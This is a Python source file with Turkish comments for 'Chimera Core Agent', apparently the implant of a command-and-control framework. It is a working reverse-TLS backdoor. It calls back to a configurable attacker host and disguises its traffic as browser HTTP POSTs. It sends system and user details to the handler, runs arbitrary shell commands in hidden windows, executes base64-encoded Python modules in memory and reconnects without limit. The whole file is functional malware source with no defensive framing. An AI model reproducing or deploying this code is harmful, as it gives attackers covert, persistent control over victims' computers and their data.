"""
Chimera Core Agent v0.1
Mah Framework için geliştirilmiş temel reverse TCP ajanı.
Sadece Python 3 standart kütüphaneleri kullanır.
"""
import socket
import subprocess
import os
import sys
import platform
import struct
import time
import ssl
import random
import string
import types
import base64

# ============================================================
# Konfigürasyon - generate.py tarafından doldurulacak
# ============================================================
LHOST = "{{LHOST}}"
LPORT = {{LPORT}}
RECONNECT_DELAY = 5      # Yeniden bağlanma bekleme süresi (saniye)
MAX_RECONNECT = -1        # -1 = sınırsız yeniden bağlanma denemesi


class ChimeraAgent:
    """Chimera Core Agent - Temel reverse TCP ajanı."""

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sock = None
        self.running = True
        self.loaded_modules = {}  # Yüklü modülleri saklar: {name: module_obj}

    # --------------------------------------------------------
    # Bağlantı Yönetimi
    # --------------------------------------------------------
    def connect(self) -> bool:
        """Handler'a reverse TCP bağlantısı kurar.
        
        Returns:
            bool: Bağlantı başarılı ise True.
        """
        try:
            # TCP Socket oluştur
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(30)
            
            # SSL Context oluştur
            # Self-signed sertifikaları kabul et
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # SSL Socket'i sarmala
            self.sock = context.wrap_socket(raw_sock, server_hostname=self.host)
            
            # Bağlan
            self.sock.connect((self.host, self.port))
            self.sock.settimeout(None)
            
            return True
        except Exception:
            self.sock = None
            return False

    def reconnect(self) -> bool:
        """Bağlantı koptuğunda yeniden bağlanmayı dener.
        
        Returns:
            bool: Yeniden bağlantı başarılı ise True.
        """
        self.close_socket()
        attempts = 0
        while self.running:
            attempts += 1
            if MAX_RECONNECT != -1 and attempts > MAX_RECONNECT:
                return False
            
            time.sleep(RECONNECT_DELAY)
            
            if self.connect():
                self.send_sysinfo()
                return True
        return False

    def close_socket(self):
        """Mevcut soketi güvenli şekilde kapatır."""
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    # --------------------------------------------------------
    # Protokol: Length-Prefixed Data Transfer
    # Format: [4 byte big-endian uzunluk][UTF-8 data]
    # --------------------------------------------------------
    # --------------------------------------------------------
    # Protokol: HTTP over TLS
    # --------------------------------------------------------
    def send_data(self, data: str):
        """Veriyi HTTP POST request olarak gönderir (Obfuscation)."""
        if not self.sock:
            return
        try:
            encoded_body = data.encode("utf-8")
            
            # Rastgele bir Boundary veya User-Agent üretilebilir
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            
            # HTTP Request Oluştur
            # POST /api/submit HTTP/1.1
            request = (
                b"POST /api/v1/sync HTTP/1.1\r\n"
                b"Host: " + self.host.encode() + b"\r\n"
                b"User-Agent: " + user_agent.encode() + b"\r\n"
                b"Content-Type: application/x-www-form-urlencoded\r\n"
                b"Content-Length: " + str(len(encoded_body)).encode() + b"\r\n"
                b"Connection: keep-alive\r\n"
                b"\r\n"
            )
            
            self.sock.sendall(request + encoded_body)
        except Exception:
            pass

    def recv_data(self) -> str:
        """HTTP Response içinden veriyi okur."""
        if not self.sock:
            return ""
        try:
            # Headerları oku (\r\n\r\n bulana kadar)
            header_buffer = b""
            while b"\r\n\r\n" not in header_buffer:
                chunk = self.sock.recv(1)
                if not chunk: return ""
                header_buffer += chunk
            
            # Content-Length bul
            headers = header_buffer.decode('utf-8', errors='ignore')
            content_length = 0
            for line in headers.split('\r\n'):
                if line.lower().startswith('content-length:'):
                    try:
                        content_length = int(line.split(':')[1].strip())
                    except:
                        pass
            
            # Body'yi oku (Payload)
            body = b""
            while len(body) < content_length:
                chunk = self.sock.recv(content_length - len(body))
                if not chunk: break
                body += chunk
                
            return body.decode("utf-8")
            
        except Exception:
            return ""

    def _recv_exact(self, n: int) -> bytes:
        """Tam olarak n byte veri okur.
        
        Args:
            n: Okunacak byte sayısı.
            
        Returns:
            bytes: Okunan veri veya None.
        """
        data = b""
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    # --------------------------------------------------------
    # Sistem Bilgisi
    # --------------------------------------------------------
    def send_sysinfo(self):
        """Sistem bilgisini toplayıp handler'a gönderir."""
        try:
            uname = platform.uname()
            
            # Kullanıcı adı
            try:
                username = os.getlogin()
            except Exception:
                username = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
            
            # Sistem bilgisi formatı
            info_parts = [
                f"OS: {uname.system} {uname.release}",
                f"Hostname: {uname.node}",
                f"User: {username}",
                f"PID: {os.getpid()}",
                f"Arch: {uname.machine}",
                f"Python: {platform.python_version()}"
            ]
            info = " | ".join(info_parts)
            self.send_data(info)
        except Exception:
            self.send_data("Chimera Agent Connected")

    # --------------------------------------------------------
    # Komut Çalıştırma
    # --------------------------------------------------------
    def execute_command(self, cmd: str) -> str:
        """Sistem komutu çalıştırır.
        
        Args:
            cmd: Çalıştırılacak komut.
            
        Returns:
            str: Komut çıktısı.
        """
        # Özel komutlar
        if cmd.strip().lower() == "terminate":
            self.running = False
            return "Agent sonlandırılıyor..."
        
        # Özel komutlar - Modül Yönetimi (Faz 2.1)
        if cmd.startswith("loadmodule "):
            try:
                # Format: loadmodule <name> <b64_code>
                parts = cmd.split(" ", 2)
                if len(parts) < 3:
                    return "[!] Kullanım: loadmodule <name> <b64_code>"
                
                module_name = parts[1]
                b64_code = parts[2]
                
                # Base64 decode
                code = base64.b64decode(b64_code).decode("utf-8")
                
                # Yeni modül oluştur
                mod = types.ModuleType(module_name)
                
                # Kodu modül context'inde çalıştır
                exec(code, mod.__dict__)
                
                # Modülü sisteme kaydet
                sys.modules[module_name] = mod
                self.loaded_modules[module_name] = mod
                
                return f"[+] Modül '{module_name}' hafızaya yüklendi."
            except Exception as e:
                return f"[!] Modül yükleme hatası: {str(e)}"

        elif cmd.startswith("runmodule "):
            try:
                # Format: runmodule <name> [func] [args...]
                parts = cmd.strip().split(" ")
                if len(parts) < 2:
                    return "[!] Kullanım: runmodule <name> [func]"
                
                module_name = parts[1]
                func_name = parts[2] if len(parts) > 2 else "run"
                args = parts[3:]
                
                if module_name not in self.loaded_modules:
                    return f"[!] Hata: '{module_name}' modülü yüklü değil."
                
                mod = self.loaded_modules[module_name]
                
                if not hasattr(mod, func_name):
                    return f"[!] Hata: '{func_name}' fonksiyonu bulunamadı."
                
                # Fonksiyonu çalıştır
                func = getattr(mod, func_name)
                
                # Argümanları dinamik olarak ilet
                if args:
                    result = func(*args)
                else:
                    result = func()
                    
                return str(result) if result is not None else "[+] Fonksiyon çalıştırıldı (Dönüş değeri yok)."
            except Exception as e:
                return f"[!] Modül çalıştırma hatası: {str(e)}"

        elif cmd.strip() == "listmodules":
            if not self.loaded_modules:
                return "[-] Yüklü modül yok."
            return "Yüklü Modüller:\n" + "\n".join([f"- {name}" for name in self.loaded_modules.keys()])

        try:
            # Komutu gizli pencerede çalıştır
            startupinfo = None
            if sys.platform == "win32":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0  # SW_HIDE

            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                startupinfo=startupinfo
            )
            stdout, stderr = proc.communicate(timeout=30)
            
            output = stdout + stderr
            result = output.decode("utf-8", errors="ignore")
            
            if not result.strip():
                result = f"[Komut tamamlandı - çıkış kodu: {proc.returncode}]"
            
            return result
        except subprocess.TimeoutExpired:
            proc.kill()
            return "[!] Komut zaman aşımına uğradı (30s)"
        except Exception as e:
            return f"[!] Hata: {str(e)}"

    # --------------------------------------------------------
    # Ana Döngü
    # --------------------------------------------------------
    def run(self):
        """Ajanın ana çalışma döngüsü.
        
        1. Handler'a bağlan
        2. Sistem bilgisini gönder
        3. Komut al → çalıştır → sonuç gönder döngüsü
        4. Bağlantı koparsa yeniden bağlan
        """
        # İlk bağlantı
        if not self.connect():
            if not self.reconnect():
                return
        
        # Sistem bilgisini gönder
        self.send_sysinfo()

        # Ana komut döngüsü
        while self.running:
            try:
                # Komut bekle
                cmd = self.recv_data()
                if not cmd:
                    # Bağlantı kopmuş, yeniden bağlan
                    if not self.reconnect():
                        break
                    continue
                
                # Komutu çalıştır
                output = self.execute_command(cmd)
                
                # Sonucu gönder
                self.send_data(output)
                
            except Exception:
                # Herhangi bir hata durumunda yeniden bağlan
                if self.running:
                    if not self.reconnect():
                        break

        # Temiz çıkış
        self.close_socket()


# ============================================================
# Ana Giriş Noktası
# ============================================================
if __name__ == "__main__":
    try:
        agent = ChimeraAgent(LHOST, LPORT)
        agent.run()
    except Exception:
        pass
